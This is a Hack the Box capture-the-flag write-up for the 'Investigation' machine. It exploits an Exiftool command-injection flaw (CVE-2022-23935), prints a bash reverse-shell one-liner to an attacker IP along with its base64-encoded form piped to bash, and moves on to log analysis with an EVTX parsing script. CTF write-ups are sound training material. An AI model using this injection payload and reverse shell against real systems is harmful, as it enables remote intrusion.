# Hack the Box - Investigation

```CSS
Machine IP: 10.10.11.197 - Linux
```
- Home Page
![image](https://user-images.githubusercontent.com/83878909/229590867-b6247863-847c-4542-9262-8b49d68df091.png)
- Service Page (File Upload)
![image](https://user-images.githubusercontent.com/83878909/229591086-ae649d64-42c7-4d06-b226-766ab832b99b.png)
- Analysed Image Report
![image](https://user-images.githubusercontent.com/83878909/229594569-1b66a61c-ca06-46af-ab8a-74fc5013a9e5.png)

## Exiftool
- Version 12.97 is vulnerable to [CVE-2022-23935](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429).

## Exploit
  - Testing the exploit using ping. Ping the attacker machine and capture ICMP packets if the ping is received.
![image](https://user-images.githubusercontent.com/83878909/229599022-e4a6e61a-e57b-443f-867f-d6c083766361.png)
  - Ping received.
![image](https://user-images.githubusercontent.com/83878909/229599327-3589ec39-e31f-4c38-a8c5-20ebf6b5f5dc.png)

- Sending the payload in base64 format and decrypting it on the victim machine.
  - Payload: `/bin/bash -i >& /dev/tcp/10.10.14.34/9001 0>&1`=`echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM0LzkwMDEgMD4mMQ==' | base64 -d | bash |`
![image](https://user-images.githubusercontent.com/83878909/229601047-d8811696-5f5d-482a-a8bc-f421c49b9d36.png)
  - Reverse Shell
![image](https://user-images.githubusercontent.com/83878909/229601230-9c508f23-7f61-4b3b-a0df-42521867ac4c.png)

---

- Found `.msg` file in `/usr/local/investigation`.
  - Transfer the file to attacker machine.
![image](https://user-images.githubusercontent.com/83878909/229604774-0211e995-a22b-4a49-ab70-77968c74c204.png)
  - Receive File - renamed to `analysis.msg`
![image](https://user-images.githubusercontent.com/83878909/229604983-c4243c4e-900b-452d-a88f-20bc83f39555.png)
  - Access the file using an online tool `https://products.aspose.app/`.
![image](https://user-images.githubusercontent.com/83878909/229606099-e31e6d5e-d398-4441-9163-6c8327539e46.png)
  - Download the `zip` file using an online tool `https://www.encryptomatic.com/viewer/`.
![image](https://user-images.githubusercontent.com/83878909/229606850-9d9590fa-ea22-4650-82e9-7ec1a48e82b0.png)
  - Found `security.evtx` after unzipping the file.
  - Use the code below to create a readable file.
```Python
import Evtx.Evtx as evtx
import Evtx.Views as e_views

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Dump a binary EVTX file into XML.")
    parser.add_argument("evtx", type=str,
                        help="Path to the Windows EVTX event log file")
    args = parser.parse_args()

    with evtx.Evtx(args.evtx) as log:
        print(e_views.XML_HEADER)
        print("<Events>")
        for record in log.records():
            print(record.xml())
        print("</Events>")


if __name__ == "__main__":
    main()
```
